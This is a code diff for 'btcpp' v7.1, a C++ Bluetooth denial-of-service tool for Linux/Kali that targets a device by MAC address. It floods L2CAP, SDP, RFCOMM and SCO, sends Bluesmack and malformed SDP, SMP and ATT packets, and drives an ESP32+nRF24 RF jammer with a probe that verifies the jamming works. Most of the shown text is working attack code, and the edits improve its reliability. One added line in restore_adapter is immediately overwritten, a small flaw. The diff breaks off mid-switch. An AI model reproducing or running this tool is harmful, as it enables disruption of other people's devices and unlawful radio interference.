@@ -1,8 +1,8 @@
-// btcpp v7 — Linux/Kali Bluetooth multi-vector stress tool + RF jamming orchestrator
+// btcpp v7.1 — Linux/Kali Bluetooth multi-vector stress tool + RF jamming orchestrator
 //
 // Build:   g++ -O2 -std=c++17 -pthread btcpp.cpp -o btcpp -lbluetooth
 // Usage:   sudo ./btcpp -t <MAC> [-i iface] [-d sec] [-T thr] [-V mask]
-//                        [-p serialdev] [-M BT|BLE|ALL] [-R pub|rand] [-E] [-A] [-j] [-s] [-v] [-h]
+//                        [-p serialdev] [-M BT|BLE|ALL] [-E] [-A] [-j] [-s] [-v] [-h]
 //
 // Vectors (mask):
 //     1 = L2CAP flood            2 = HCI create_conn
@@ -15,17 +15,41 @@
 // RF vector requires external hardware: ESP32 flashed with the nrfBlueNullifier
 // Enhanced v2.1 sketch (ACK protocol version), connected via USB serial.
 //
-// New in v7:
+// NEW IN v7.1 (change log — grep "[FIX-n]" to locate each edit):
+//   [FIX-1] RFCOMM fd leak: rotating held sockets now closes the evicted fd
+//           BEFORE pushing the new one; previously the oldest fd was erased
+//           from 'held' without close() and leaked permanently.
+//   [FIX-2] RFCOMM stats gap: a failed send() after a successful connect was
+//           silently unrecorded; every failure path now records.
+//   [FIX-3] setsockopt(SO_KEEPALIVE) result is checked: the socket is only
+//           kept in 'held' if the required option was set successfully.
+//   [FIX-4] -E (efficacy probe) without a Bluetooth adapter now exits with
+//           code 2 BEFORE baseline/tune/workers. Previously probes without
+//           an adapter failed 100% and produced a FALSE RF_EFFECT_VERIFIED.
+//   [FIX-5] -V mask validation: undefined bits (>12) are stripped with a
+//           warning; if nothing valid remains, exit code 2. The previous
+//           silent fallback to vector 0 (unwanted L2CAP run) is removed.
+//   [FIX-6] Thread allocation "Option A": every SELECTED vector gets exactly
+//           one thread — no silent vector drops. Effective thread count =
+//           number of selected vectors. -T is a SOFT CAP: if -T < selected
+//           count, threads are raised (with a loud notice); if -T > selected
+//           count, no extra threads are created. -V 2048 always runs RF.
+//   [FIX-7] send() outcome semantics: EAGAIN/EWOULDBLOCK (non-blocking send
+//           made no progress) is DISTINGUISHED from real send errors. Each
+//           vector decides what each outcome means for ITS OWN statistics —
+//           the helper classifies, it does not auto-record. Partial sends
+//           (0 < n < len) are reported separately where meaningful.
+//   [FIX-8] usage(): -T documented as a soft concurrency cap.
+//
+// Carried over from v7:
 //   - Statistics and pacing fully separated: record() (per-vector stats) and
 //     note_outcome()/evt_snapshot() (mutex-consistent global rate) with a
-//     dedicated pacer thread applying AIMD. No double counting, no per-thread
-//     races on the shared delay.
-//   - nb_connect(): input validation (EINVAL), absolute steady_clock deadline
-//     (EINTR no longer extends the timeout), validated fcntl restore on every
-//     exit path, real errno preserved (saved/restored around restore()).
+//     dedicated pacer thread applying AIMD. No double counting.
+//   - nb_connect(): input validation (EINVAL), absolute steady_clock deadline,
+//     validated fcntl restore on every exit path, real errno preserved.
 //   - RF control uses a structured ACK protocol: "ACK|<cmd>|<state>|<radioA>|<radioB>"
 //     and "ERR|<cmd>|<reason>". Parser validates every field strictly; boolean
-//     fields must be exactly "0" or "1" — anything else invalidates the message.
+//     fields must be exactly "0" or "1".
 //   - RF status is a 5-level model (DISCONNECTED .. RF_EFFECT_VERIFIED), each
 //     level only reachable after the previous one. isChipConnected() is treated
 //     as "chip responds on SPI", NOT as full RF health.
@@ -76,7 +100,7 @@ static bool                  g_json = false;
 static bool                  g_tune = false;
 static bool                  g_efficacy = false;
 static std::string           g_serial;            // e.g. /dev/ttyUSB0
-static std::string           g_rfmode = "A";      // B=BT Classic, b/BLE handling below
+static std::string           g_rfmode = "A";      // [FIX-8 note] T=BT classic, B=BLE, A=both
 static std::mt19937          g_rng{std::random_device{}()};
 
 static void on_sigint(int) { g_run = false; }
@@ -154,6 +178,40 @@ static inline void paced_sleep() {
     int d = g_delay_us.load(std::memory_order_relaxed);
     int j = d > 8 ? (int)(g_rng() % (uint32_t)(d / 8)) : 0;   // jitter
     std::this_thread::sleep_for(std::chrono::microseconds(d + j));
+}
+
+// =====================================================================
+// [FIX-7] Send outcome classification — SHARED classifier, per-vector policy
+//
+// The helper only CLASSIFIES the raw send() result. It never records stats
+// itself: each vector maps the outcome to ITS OWN operational meaning.
+//
+//   SEND_FULL     : n == len (whole payload handed to the kernel)
+//   SEND_PARTIAL  : 0 < n < len (only meaningful for stream sockets;
+//                   SOCK_SEQPACKET/DGRAM are all-or-nothing in practice)
+//   SEND_BLOCKED  : EAGAIN/EWOULDBLOCK — no progress NOW; says nothing
+//                   definite about link health by itself
+//   SEND_ERR      : any other error — a real failure
+//
+// Per-vector mapping used below (documented at each call site):
+//   - Stream sockets (RFCOMM):        FULL -> ok, BLOCKED -> skip (no
+//     record: buffer full is backpressure, not a protocol failure),
+//     PARTIAL/ERR -> error.
+//   - SEQPACKET/DGRAM (all L2CAP/SCO vectors): FULL -> ok, PARTIAL treated
+//     as ERR (should not happen; counted loudly if it does), BLOCKED ->
+//     skip, ERR -> error.
+//
+// "Send accepted by the kernel" is NOT proof the target received or
+// processed the payload — that limitation is inherent to all vectors here.
+// =====================================================================
+
+enum SendOutcome { SEND_FULL, SEND_PARTIAL, SEND_BLOCKED, SEND_ERR };
+
+static SendOutcome classify_send(ssize_t n, size_t len) {
+    if (n == (ssize_t)len)  return SEND_FULL;
+    if (n > 0)              return SEND_PARTIAL;
+    if (errno == EAGAIN || errno == EWOULDBLOCK) return SEND_BLOCKED;
+    return SEND_ERR;
 }
 
 // =====================================================================
@@ -310,6 +368,7 @@ static void restore_adapter(int dev_id) {
     write_scan_enable_cp cp; cp.enable = 0;
     struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
     rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_SCAN_ENABLE;
+    rq.cparam = &cp; rq.clen = WRITE_PAGE_TIMEOUT_CP_SIZE;
     rq.cparam = &cp; rq.clen = WRITE_SCAN_ENABLE_CP_SIZE;
     hci_send_req(ctl, &rq, 1000);
     hci_close_dev(ctl);
@@ -337,6 +396,10 @@ static void do_scan(int dev_id) {
 // Method: attempt small L2CAP connections to the target and measure the
 // failure rate. A rising failure rate DURING jamming vs. the baseline is
 // independent evidence that RF disruption is affecting the link.
+//
+// [FIX-4] main() refuses to run with -E when no adapter exists, so every
+// probe failure counted here is a real connection attempt failure, not an
+// artifact of a missing local HCI device.
 // =====================================================================
 
 static std::atomic<uint64_t> g_probe_try{0}, g_probe_fail{0};
@@ -375,6 +438,9 @@ static double efficacy_current() {
 // =====================================================================
 
 // vec 0 (mask 1): L2CAP flood
+// [FIX-7] send outcomes: FULL -> ok; BLOCKED -> skip (backpressure, not a
+// protocol failure — no record either way); PARTIAL/ERR -> error. Partial
+// sends on SEQPACKET are counted as errors loudly (should not happen).
 static void vec_l2cap() {
     static thread_local uint8_t payload[672];
     memset(payload, 0x41, sizeof(payload));
@@ -383,8 +449,10 @@ static void vec_l2cap() {
         if (s < 0) { record(0, false); note_outcome(false); paced_sleep(); continue; }
         if (l2_connect(s, 0x0001, 0x0001) == 0) {
             for (int i = 0; i < 6 && g_run; ++i) {
-                ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
-                if (n > 0) { record(0, true, n); note_outcome(true); }
+                SendOutcome o = classify_send(::send(s, payload, sizeof(payload), MSG_DONTWAIT),
+                                              sizeof(payload));
+                if (o == SEND_FULL) { record(0, true, sizeof(payload)); note_outcome(true); }
+                else if (o == SEND_BLOCKED) break;             // skip, no record
                 else { record(0, false); note_outcome(false); break; }
             }
         } else { record(0, false); note_outcome(false); }
@@ -415,6 +483,10 @@ static void vec_hci_conn() {
 }
 
 // vec 2 (mask 4): RFCOMM hold
+// [FIX-1] rotation closes the evicted fd before it leaves 'held' (leak fixed)
+// [FIX-2] failed send after successful connect is now recorded (gap fixed)
+// [FIX-3] setsockopt(SO_KEEPALIVE) result is checked; socket kept only on success
+// [FIX-7] stream-socket send semantics: BLOCKED -> skip, PARTIAL -> error
 static void vec_rfcomm() {
     int ch = 1;
     std::vector<int> held;
@@ -430,13 +502,29 @@ static void vec_rfcomm() {
         ch = (ch % 30) + 1;
         if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
             uint8_t junk[64]; memset(junk, 0x41, sizeof(junk));
-            ssize_t n = ::send(s, junk, sizeof(junk), MSG_DONTWAIT);
-            if (n > 0) { record(2, true, n); note_outcome(true); }
+            SendOutcome o = classify_send(::send(s, junk, sizeof(junk), MSG_DONTWAIT),
+                                          sizeof(junk));
+            if (o == SEND_FULL) { record(2, true, sizeof(junk)); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(2, false); note_outcome(false); }  // [FIX-2]
+            // [FIX-7] BLOCKED: buffer backpressure on a healthy connection —
+            // deliberately NOT recorded as success or failure.
+
             if (held.size() < 16) {
                 int ka = 1;
-                setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
-                held.push_back(s);
-            } else { ::close(s); held.erase(held.begin()); }
+                if (setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka)) == 0)
+                    held.push_back(s);                     // [FIX-3] keep only on success
+                else
+                    ::close(s);
+            } else {
+                int old = held.front();                    // [FIX-1] close BEFORE erase
+                held.erase(held.begin());
+                ::close(old);
+                int ka = 1;
+                if (setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka)) == 0)
+                    held.push_back(s);
+                else
+                    ::close(s);
+            }
         } else { record(2, false); note_outcome(false); ::close(s); }
         paced_sleep();
     }
@@ -444,6 +532,8 @@ static void vec_rfcomm() {
 }
 
 // vec 3 (mask 8): SCO
+// [FIX-7] per-vector mapping: FULL -> ok, BLOCKED -> skip, else error.
+// SCO payload acceptance is recorded as vector-level success only.
 static void vec_sco() {
     while (g_run) {
         int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
@@ -452,9 +542,9 @@ static void vec_sco() {
         a.sco_family = AF_BLUETOOTH; a.sco_bdaddr = g_dst;
         if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
             uint8_t v[48]; memset(v, 0, sizeof(v));
-            ssize_t n = ::send(s, v, sizeof(v), MSG_DONTWAIT);
-            bool ok = (n > 0);
-            record(3, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            SendOutcome o = classify_send(::send(s, v, sizeof(v), MSG_DONTWAIT), sizeof(v));
+            if (o == SEND_FULL) { record(3, true, sizeof(v)); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(3, false); note_outcome(false); }
         } else { record(3, false); note_outcome(false); }
         ::close(s); paced_sleep();
     }
@@ -463,6 +553,7 @@ static void vec_sco() {
 // vec 4 (mask 16): raw ATT frames on CID 0x0004
 // NOTE: raw malformed frames on the ATT channel — this does NOT perform real
 // GATT reads/writes and does not verify any GATT response.
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error.
 static void vec_ble_att_raw() {
     static thread_local uint8_t payload[200];
     memset(payload, 0x42, sizeof(payload));
@@ -470,15 +561,17 @@ static void vec_ble_att_raw() {
         int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
         if (s < 0) { record(4, false); note_outcome(false); paced_sleep(); continue; }
         if (l2_connect_ble(s, 0x0004) == 0) {
-            ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
-            bool ok = (n > 0);
-            record(4, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            SendOutcome o = classify_send(::send(s, payload, sizeof(payload), MSG_DONTWAIT),
+                                          sizeof(payload));
+            if (o == SEND_FULL) { record(4, true, sizeof(payload)); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(4, false); note_outcome(false); }
         } else { record(4, false); note_outcome(false); }
         ::close(s); paced_sleep();
     }
 }
 
 // vec 5 (mask 32): SDP flood
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error.
 static void vec_sdp_flood() {
     static thread_local uint8_t req[1024];
     memset(req, 0x41, sizeof(req));
@@ -490,8 +583,10 @@ static void vec_sdp_flood() {
         if (s < 0) { record(5, false); note_outcome(false); paced_sleep(); continue; }
         if (l2_connect(s, 0x0001, 0x0001) == 0) {
             for (int i = 0; i < 4 && g_run; ++i) {
-                ssize_t n = ::send(s, req, sizeof(req), MSG_DONTWAIT);
-                if (n > 0) { record(5, true, n); note_outcome(true); }
+                SendOutcome o = classify_send(::send(s, req, sizeof(req), MSG_DONTWAIT),
+                                              sizeof(req));
+                if (o == SEND_FULL) { record(5, true, sizeof(req)); note_outcome(true); }
+                else if (o == SEND_BLOCKED) break;
                 else { record(5, false); note_outcome(false); break; }
             }
         } else { record(5, false); note_outcome(false); }
@@ -500,6 +595,7 @@ static void vec_sdp_flood() {
 }
 
 // vec 6 (mask 64): L2CAP echo/MTU probe
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error.
 static void vec_l2cap_echo() {
     static thread_local uint8_t ping[1024];
     memset(ping, 0x5A, sizeof(ping));
@@ -507,15 +603,17 @@ static void vec_l2cap_echo() {
         int s = l2_open();
         if (s < 0) { record(6, false); note_outcome(false); paced_sleep(); continue; }
         if (l2_connect(s, 0, 0x0045) == 0) {
-            ssize_t n = ::send(s, ping, sizeof(ping), MSG_DONTWAIT);
-            bool ok = (n > 0);
-            record(6, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            SendOutcome o = classify_send(::send(s, ping, sizeof(ping), MSG_DONTWAIT),
+                                          sizeof(ping));
+            if (o == SEND_FULL) { record(6, true, sizeof(ping)); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(6, false); note_outcome(false); }
         } else { record(6, false); note_outcome(false); }
         ::close(s); paced_sleep();
     }
 }
 
 // vec 7 (mask 128): Bluesmack — oversized L2CAP Echo Request
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error.
 static void vec_bluesmack() {
     static thread_local uint8_t pkt[2048];
     memset(pkt, 0x42, sizeof(pkt));
@@ -526,15 +624,17 @@ static void vec_bluesmack() {
         int s = l2_open();
         if (s < 0) { record(7, false); note_outcome(false); paced_sleep(); continue; }
         if (l2_connect(s, 0x0001, 0x0001) == 0) {
-            ssize_t n = ::send(s, pkt, sizeof(pkt), MSG_DONTWAIT);
-            bool ok = (n > 0);
-            record(7, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            SendOutcome o = classify_send(::send(s, pkt, sizeof(pkt), MSG_DONTWAIT),
+                                          sizeof(pkt));
+            if (o == SEND_FULL) { record(7, true, sizeof(pkt)); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(7, false); note_outcome(false); }
         } else { record(7, false); note_outcome(false); }
         ::close(s); paced_sleep();
     }
 }
 
 // vec 8 (mask 256): L2CAP signaling abuse — repeated identifier, alternating PDUs
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error.
 static void vec_l2cap_sigabuse() {
     static thread_local uint8_t req[64];
     while (g_run) {
@@ -553,8 +653,9 @@ static void vec_l2cap_sigabuse() {
                     req[4] = 0x41; req[5] = 0x41;
                     req[6] = 0x41; req[7] = 0x41;
                 }
-                ssize_t n = ::send(s, req, 8, MSG_DONTWAIT);
-                if (n > 0) { record(8, true, n); note_outcome(true); }
+                SendOutcome o = classify_send(::send(s, req, 8, MSG_DONTWAIT), 8);
+                if (o == SEND_FULL) { record(8, true, 8); note_outcome(true); }
+                else if (o == SEND_BLOCKED) break;
                 else { record(8, false); note_outcome(false); break; }
                 std::this_thread::sleep_for(std::chrono::microseconds(200));
             }
@@ -564,6 +665,7 @@ static void vec_l2cap_sigabuse() {
 }
 
 // vec 9 (mask 512): SDP malformed queries
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error — per variant.
 static void vec_sdp_malformed() {
     static thread_local uint8_t req[256];
     while (g_run) {
@@ -578,9 +680,9 @@ static void vec_sdp_malformed() {
             req[5] = 0x00; req[6] = 0x01; req[7] = 0x00; req[8] = 0x01;
             req[9] = 0xFF; req[10] = 0xFA;
             memset(&req[11], 0x41, 200);
-            ssize_t n = ::send(s, req, 211, MSG_DONTWAIT);
-            bool ok = (n > 0);
-            record(9, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            SendOutcome o = classify_send(::send(s, req, 211, MSG_DONTWAIT), 211);
+            if (o == SEND_FULL) { record(9, true, 211); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(9, false); note_outcome(false); }
 
             // Variant 2: ServiceSearchRequest, uuid-count lies about content
             memset(req, 0, sizeof(req));
@@ -588,9 +690,9 @@ static void vec_sdp_malformed() {
             req[1] = 0x00; req[2] = 0x02;
             req[3] = 0x00; req[4] = 0x08;
             req[5] = 0x03; req[6] = 0x00;
-            n = ::send(s, req, 7, MSG_DONTWAIT);
-            ok = (n > 0);
-            record(9, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+            o = classify_send(::send(s, req, 7, MSG_DONTWAIT), 7);
+            if (o == SEND_FULL) { record(9, true, 7); note_outcome(true); }
+            else if (o != SEND_BLOCKED) { record(9, false); note_outcome(false); }
         } else { record(9, false); note_outcome(false); }
         ::close(s); paced_sleep();
     }
@@ -600,6 +702,7 @@ static void vec_sdp_malformed() {
 // NOTE: this does NOT run the SMP state machine and does not track pairing
 // responses; its effect is limited to embedded stacks that misbehave when
 // bombarded with repeated raw SM requests.
+// [FIX-7] FULL -> ok, BLOCKED -> skip, else error — per frame.
 static void vec_ble_sm_att_raw() {
     static thread_local uint8_t sm[6] = {0x01, 0x05, 0x0D, 0x08, 0x00, 0x00};
     static thread_local uint8_t att_rd[3] = {0x0A, 0x01, 0x00};
@@ -612,9 +715,9 @@ static void vec_ble_sm_att_raw() {
         int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
         if (s >= 0) {
             if (l2_connect_ble(s, 0x0006) == 0) {
-                ssize_t n = ::send(s, sm, 6, MSG_DONTWAIT);
-                bool ok = (n > 0);
-                record(10, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
+                SendOutcome o = classify_send(::send(s, sm, 6, MSG_DONTWAIT), 6);
+                if (o == SEND_FULL) { record(10, true, 6); note_outcome(true); }
+                else if (o != SEND_BLOCKED) { record(10, false); note_outcome(false); }
             } else { record(10, false); note_outcome(false); }
             ::close(s);
         } else { record(10, false); note_outcome(false); }
@@ -627,8 +730,9 @@ static void vec_ble_sm_att_raw() {
                 for (int i = 0; i < 5 && g_run; ++i) {
                     uint8_t* p = (i % 2 == 0) ? att_rd : att_wr;
                     size_t   l = (i % 2 == 0) ? 3 : 32;
-                    ssize_t n = ::send(s, p, l, MSG_DONTWAIT);
-                    if (n > 0) { record(10, true, n); note_outcome(true); }
+                    SendOutcome o = classify_send(::send(s, p, l, MSG_DONTWAIT), l);
+                    if (o == SEND_FULL) { record(10, true, l); note_outcome(true); }
+                    else if (o == SEND_BLOCKED) break;
                     else { record(10, false); note_outcome(false); break; }
                 }
             } else { record(10, false); note_outcome(false); }
@@ -764,6 +868,8 @@ static int serial_open(const std::string& dev) {
 }
 
 // vec 11 (mask 2048): RF jamming via serial-controlled ESP32+nRF24
+// [FIX-6] with Option A allocation this vector ALWAYS gets a thread whenever
+// mask bit 2048 is set, regardless of -T.
 static void vec_rf_serial() {
     if (g_serial.empty()) {
         printf("[-] RF vector selected but no serial port given (-p /dev/ttyUSB0)\n");
@@ -923,22 +1029,30 @@ static void reporter(uint64_t start_ms) {
 // =====================================================================
 
 static void usage(const char* prog) {
-    printf("=== btcpp v7 — Bluetooth stress + RF jamming orchestrator (Linux/Kali) ===\n\n");
+    printf("=== btcpp v7.1 — Bluetooth stress + RF jamming orchestrator (Linux/Kali) ===\n\n");
     printf("Usage: %s -t <MAC> [options]\n\n", prog);
     printf("Required:\n");
     printf("  -t <MAC>        Target Bluetooth MAC\n\n");
     printf("Protocol vectors (via BlueZ/HCI):\n");
     printf("  -i <iface>      HCI interface (default: hci0)\n");
-    printf("  -T <threads>    Threads 1-14 (default: 8)\n");
+    // [FIX-8] -T documented as what it actually is in v7.1
+    printf("  -T <threads>    Concurrency cap 1-14 (default: 8). Every selected\n");
+    printf("                  vector gets exactly one thread; -T is a SOFT cap.\n");
+    printf("                  If -T is lower than the selected vector count,\n");
+    printf("                  threads are raised to that count (with a notice);\n");
+    printf("                  if higher, no extra threads are created.\n");
     printf("  -R <pub|rand>   BLE address type (default: pub)\n");
     printf("  -A              Tune adapter (page/inq scan)\n\n");
     printf("RF jamming (requires ESP32+nRF24 hardware with ACK-protocol firmware):\n");
     printf("  -p <dev>        Serial port of ESP32 (e.g. /dev/ttyUSB0)\n");
     printf("  -M <mode>       RF mode: T=BT Classic, B=BLE, A=All (default: A)\n");
-    printf("  -E              Efficacy probe: independently measure jamming effect\n\n");
+    printf("  -E              Efficacy probe: independently measure jamming effect\n");
+    printf("                  (requires a Bluetooth adapter; refuses to run without one)\n\n");
     printf("General:\n");
     printf("  -d <seconds>    Duration (default: 30)\n");
-    printf("  -V <mask>       Vector mask (default: 4095 = all):\n");
+    printf("  -V <mask>       Vector mask (default: 4095 = all). Undefined bits\n");
+    printf("                  are stripped with a warning; an empty valid mask\n");
+    printf("                  is a hard error.\n");
     printf("                   1=L2CAP       2=HCI conn     4=RFCOMM      8=SCO\n");
     printf("                  16=BLE raw    32=SDP flood   64=L2 echo\n");
     printf("                 128=Bluesmack 256=Sig abuse  512=SDP malformed\n");
@@ -979,6 +1093,19 @@ int main(int argc, char** argv) {
         }
     }
 
+    // [FIX-5] Mask validation: strip undefined bits with a warning; hard-fail
+    // if nothing valid remains. This replaces the previous silent fallback
+    // (invalid mask silently running vector 0).
+    const unsigned valid_mask = (1u << kVecCount) - 1u;
+    if (mask & ~valid_mask) {
+        fprintf(stderr, "[!] warning: -V mask has undefined bits (>12); ignoring them\n");
+        mask &= valid_mask;
+    }
+    if (mask == 0) {
+        fprintf(stderr, "[-] -V selects no valid vectors\n");
+        return 2;
+    }
+
     if ((mask & 2048) && g_serial.empty()) {
         fprintf(stderr, "[-] RF vector (mask 2048) requires -p <serial_port>\n");
         fprintf(stderr, "    e.g. -p /dev/ttyUSB0  (check: ls /dev/ttyUSB* /dev/ttyACM*)\n");
@@ -994,6 +1121,17 @@ int main(int argc, char** argv) {
         fprintf(stderr, "      2. Run: sudo hciconfig hci0 up\n");
         fprintf(stderr, "      3. Check: hciconfig -a\n");
         fprintf(stderr, "      4. In a VM: pass the USB device to the VM\n");
+        return 2;
+    }
+
+    // [FIX-4] -E without an adapter is a hard error BEFORE baseline, adapter
+    // tuning, or worker startup. Without an adapter, every probe fails and
+    // the "failure-rate rise" heuristic would report a false RF_EFFECT_VERIFIED.
+    if (g_efficacy && g_dev < 0) {
+        fprintf(stderr, "[-] -E requires a Bluetooth adapter for the baseline and\n");
+        fprintf(stderr, "    in-jam probes. Without one the failure rate is an artifact\n");
+        fprintf(stderr, "    of the missing adapter and would produce a false\n");
+        fprintf(stderr, "    RF_EFFECT_VERIFIED verdict.\n");
         return 2;
     }
 
@@ -1015,44 +1153,46 @@ int main(int argc, char** argv) {
     }
     g_dst_type = (bletype == "rand") ? BDADDR_LE_RANDOM : BDADDR_LE_PUBLIC;
 
-    printf("=== btcpp v7 ===\n");
-    printf("[*] target=%s iface=%s dur=%ds threads=%d mask=0x%X ble=%s tune=%d json=%d efficacy=%d\n",
+    printf("=== btcpp v7.1 ===\n");
+    printf("[*] target=%s iface=%s dur=%ds threads(cap)=%d mask=0x%X ble=%s tune=%d json=%d efficacy=%d\n",
            mac.c_str(), iface.c_str(), seconds, threads, mask,
            bletype.c_str(), (int)g_tune, (int)g_json, (int)g_efficacy);
     if (!g_serial.empty())
         printf("[*] RF jammer: %s (mode %s)\n", g_serial.c_str(), g_rfmode.c_str());
     printf("[*] Ctrl+C to stop\n\n");
 
+    // [FIX-6] Option A allocation: every selected vector gets exactly one
+    // thread — no silent vector drops. Effective thread count == number of
+    // selected vectors. -T is a soft cap: enforced downward only (no extra
+    // threads above the vector count), and overridden upward with a loud
+    // notice if the user asked for fewer threads than selected vectors.
+    // The previous silent fallback for an empty selection is intentionally
+    // ABSENT: mask==0 was already rejected above, so 'sel' cannot be empty.
+    std::vector<int> sel;
+    for (int b = 0; b < kVecCount; b++)
+        if (mask & (1u << b)) sel.push_back(b);
+
+    if (threads < (int)sel.size())
+        printf("[*] note: -T %d < %d selected vectors; running %d threads so no "
+               "selected vector is dropped (-T acts as a soft cap)\n",
+               threads, (int)sel.size(), (int)sel.size());
+    else if (threads > (int)sel.size())
+        printf("[*] note: -T %d > %d selected vectors; each vector runs exactly "
+               "one thread (%d total)\n", threads, (int)sel.size(), (int)sel.size());
+    threads = (int)sel.size();
+
     tune_adapter(g_dev);
 
-    // Efficacy baseline BEFORE any jamming starts
+    // Efficacy baseline BEFORE any jamming starts (adapter guaranteed by [FIX-4])
     if (g_efficacy && g_dev >= 0)
         efficacy_baseline(seconds);
-
-    auto pick = [&](int slot) {
-        std::vector<int> sel;
-        if (mask & 1)    sel.push_back(0);
-        if (mask & 2)    sel.push_back(1);
-        if (mask & 4)    sel.push_back(2);
-        if (mask & 8)    sel.push_back(3);
-        if (mask & 16)   sel.push_back(4);
-        if (mask & 32)   sel.push_back(5);
-        if (mask & 64)   sel.push_back(6);
-        if (mask & 128)  sel.push_back(7);
-        if (mask & 256)  sel.push_back(8);
-        if (mask & 512)  sel.push_back(9);
-        if (mask & 1024) sel.push_back(10);
-        if (mask & 2048) sel.push_back(11);
-        if (sel.empty()) sel.push_back(0);
-        return sel[slot % sel.size()];
-    };
 
     uint64_t start = now_ms();
     std::thread rep(reporter, start);
     std::thread pacer(pacer_loop);
     std::vector<std::thread> pool;
     for (int i = 0; i < threads; ++i) {
-        int v = pick(i);
+        int v = sel[i];
         pool.emplace_back([v]() {
             switch (v) {
                 case 0:  vec_l2cap();          break;
